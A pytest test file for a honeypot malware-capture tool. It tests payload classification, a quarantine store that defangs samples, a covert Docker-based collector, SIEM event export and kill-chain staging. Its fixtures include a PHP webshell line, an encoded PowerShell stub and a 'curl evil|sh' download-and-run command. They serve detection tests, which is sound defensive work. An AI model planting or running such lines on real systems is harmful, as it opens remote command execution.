"""Covert sample capture and the kill-chain map.

Docker is not required: the collector's two host-side primitives (_diff, _pull)
are overridden with fakes, so the capture logic is tested without dropping real
malware anywhere.
"""
import hashlib
import json
from pathlib import Path

import pytest

import siem
import killchain
import sample_capture
from sample_capture import SampleStore, SampleCollector, classify


# ── classification ───────────────────────────────────────────────────────────

def test_executables_are_recognised_by_magic():
    assert classify(b"MZ\x90\x00rest") == "pe"
    assert classify(b"\x7fELF\x02\x01") == "elf"
    assert classify(b"\xcf\xfa\xed\xfe...") == "macho"
    assert classify(b"#!/bin/sh\n...") == "script"
    assert classify(b"PK\x03\x04...") == "zip"
    assert classify(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1") == "ole"


def test_text_droppers_without_magic_are_caught():
    assert classify(b"<?php system($_GET['c']); ?>") == "script"
    assert classify(b"powershell -enc AAAA") == "script"


def test_benign_content_is_not_a_payload():
    assert classify(b"just some ordinary configuration text") is None
    assert classify(b"username=admin\ntimeout=30\n") is None


# ── defanged store ───────────────────────────────────────────────────────────

def test_the_copy_on_disk_is_not_runnable(tmp_path):
    """The operator's rule is 'do not get my system infected'. A captured
    sample is real malware; the bytes on disk must not be a valid executable."""
    store = SampleStore(tmp_path)
    payload = b"MZ\x90\x00" + b"pretend-cobalt-strike-beacon" * 50
    rec = store.store(payload, {"container": "d", "path": "/x", "kind": "pe"})

    on_disk = (tmp_path / f"{rec['sha256']}.quar").read_bytes()
    assert not on_disk.startswith(b"MZ"), "runnable header sitting on disk"
    assert on_disk != payload


def test_unpack_restores_the_original_for_analysis(tmp_path):
    store = SampleStore(tmp_path)
    payload = b"\x7fELF" + bytes(range(256)) * 4
    rec = store.store(payload, {"container": "d", "path": "/x", "kind": "elf"})
    assert store.unpack(rec["sha256"]) == payload
    assert rec["sha256"] == hashlib.sha256(payload).hexdigest()


def test_the_same_sample_is_not_stored_twice(tmp_path):
    store = SampleStore(tmp_path)
    payload = b"MZ duplicate"
    store.store(payload, {"container": "d", "path": "/a", "kind": "pe"})
    assert store.has(hashlib.sha256(payload).hexdigest())


# ── the collector, without docker ────────────────────────────────────────────

def _collector(tmp_path, files):
    """A collector whose host primitives are faked. `files` maps path -> bytes;
    a path absent from `files` is a directory or a vanished file."""
    store = SampleStore(tmp_path)
    ex = siem.SiemExporter(mode="jsonl", path=tmp_path / "siem.jsonl")
    col = SampleCollector(exporter=ex, store=store, containers=["d"])
    col._diff = lambda c: list(files)
    col._pull = lambda c, p: files.get(p)
    return col, store, ex


def test_only_payloads_are_captured_not_ordinary_files(tmp_path):
    col, store, _ = _collector(tmp_path, {
        "/root/beacon.exe":  b"MZ\x90\x00 payload",
        "/root/persist.sh":  b"#!/bin/sh\ncurl evil|sh",
        "/root/notes.txt":   b"ordinary text, not a payload",
        "/tmp/dropper":      b"\x7fELF body",
    })
    caught = {r["path"].rsplit("/", 1)[-1]: r["kind"] for r in col.scan("d")}
    assert caught == {"beacon.exe": "pe", "persist.sh": "script",
                      "dropper": "elf"}


def test_decoy_noise_paths_are_never_pulled(tmp_path):
    """qeeqbox writes /tmp/tmpXXXX; pulling those every poll is waste, and none
    is ever an attacker payload."""
    pulled = []
    col, _, _ = _collector(tmp_path, {})
    col._diff = lambda c: ["/tmp/tmp1234", "/proc/1/status", "/root/evil.exe"]
    col._pull = lambda c, p: pulled.append(p) or (b"MZreal" if "evil" in p else None)
    col.scan("d")
    assert pulled == ["/root/evil.exe"], f"pulled noise: {pulled}"


def test_a_captured_payload_ships_to_the_siem_at_installation(tmp_path):
    col, _, ex = _collector(tmp_path, {"/root/x.exe": b"MZ\x90 payload"})
    col.scan("d")
    event = json.loads((tmp_path / "siem.jsonl").read_text().splitlines()[0])
    assert event["event"]["action"] == "sample.executable"
    assert event["event"]["severity"] == 13
    assert event["threat"]["kill_chain_stage"] == "installation"
    assert event["sha256"] and event["sample_type"] == "pe"


def test_rescanning_does_not_recapture(tmp_path):
    col, _, _ = _collector(tmp_path, {"/root/x.exe": b"MZ payload"})
    assert len(col.scan("d")) == 1
    assert col.scan("d") == []


def test_an_oversize_payload_is_skipped_not_pulled_into_memory(tmp_path):
    col, store, _ = _collector(tmp_path, {})
    # Simulate _pull refusing an over-cap file the way the real one does.
    col._diff = lambda c: ["/root/huge.bin"]
    def _pull(c, p):
        col.skipped_large += 1
        return None
    col._pull = _pull
    assert col.scan("d") == []
    assert col.skipped_large == 1


# ── the capture is covert ─────────────────────────────────────────────────────

def _capture_docker_argv(fn):
    """Run fn with subprocess.run stubbed, returning every argv it issued."""
    import subprocess
    calls = []

    class _Res:
        returncode = 1
        stdout = b""
    orig = subprocess.run
    subprocess.run = lambda argv, *a, **k: (calls.append(argv), _Res())[1]
    try:
        fn()
    finally:
        subprocess.run = orig
    return calls


def test_the_collector_never_execs_in_the_container():
    """docker exec would spawn a process the attacker can see in ps. Capture
    goes through diff and cp only, which run in the daemon on the host — so
    assert on what it actually runs, not on the source (whose comments mention
    exec precisely to say it is never used)."""
    col = SampleCollector(containers=["d"])
    argv = _capture_docker_argv(lambda: (col._diff("d"),
                                         col._pull("d", "/root/evil.exe")))
    assert argv, "collector issued no docker commands"
    for cmd in argv:
        assert "exec" not in cmd, f"a process was run inside the container: {cmd}"


def test_every_docker_cp_reads_out_never_writes_in():
    """A cp INTO the container would leave a file the attacker could find."""
    col = SampleCollector(containers=["d"])
    argv = _capture_docker_argv(lambda: col._pull("d", "/root/evil.exe"))
    cp_calls = [c for c in argv if "cp" in c]
    assert cp_calls, "no docker cp was issued"
    for cmd in cp_calls:
        # `docker cp d:/path -`: source is the container, sink is stdout ('-'),
        # never `- d:/path` which would write a file into the container.
        assert cmd[-1] == "-", f"cp not streaming to stdout: {cmd}"
        assert cmd[2].startswith("d:"), f"cp source is not the container: {cmd}"


# ── siem sample emitter ───────────────────────────────────────────────────────

def test_non_executable_payloads_ship_lower_than_executables():
    ex = siem.SiemExporter(mode="jsonl", enabled=False)
    exe = ex.sample("a"*64, 100, "pe", "d", "/x")
    pdf = ex.sample("b"*64, 100, "pdf", "d", "/y")
    assert exe["event"]["severity"] > pdf["event"]["severity"]
    assert exe["event"]["action"] == "sample.executable"
    assert pdf["event"]["action"] == "sample.captured"


# ── kill chain ────────────────────────────────────────────────────────────────

def test_stages_are_ordered_and_a_full_chain_reaches_objectives():
    kc = killchain.KillChain()
    for action in ["decoy.connect", "verdict.malicious", "decoy.login_success",
                   "sample.executable", "canary.fired", "decoy.honeytoken_read"]:
        kc.add({"event": {"action": action, "severity": 10}, "session_id": "s"})
    s = kc.summary("s")
    assert s["furthest_stage"] == "actions_on_objectives"
    reached = {x["key"] for x in s["stages"] if x["reached"]}
    assert reached == {"reconnaissance", "delivery", "exploitation",
                       "installation", "command_and_control",
                       "actions_on_objectives"}


def test_a_finding_with_no_kill_chain_meaning_is_ignored():
    kc = killchain.KillChain()
    assert kc.add({"event": {"action": "verdict.clean"}, "session_id": "s"}) is None
    assert kc.sessions() == []


def test_sessions_rank_by_how_far_the_attacker_got():
    kc = killchain.KillChain()
    kc.add({"event": {"action": "decoy.connect"}, "session_id": "shallow"})
    kc.add({"event": {"action": "decoy.honeytoken_read"}, "session_id": "deep"})
    assert kc.sessions()[0] == "deep"


def test_a_captured_executable_places_them_at_installation():
    assert killchain.stage_for("sample.executable") == "installation"
    assert killchain.stage_for("canary.fired") == "command_and_control"
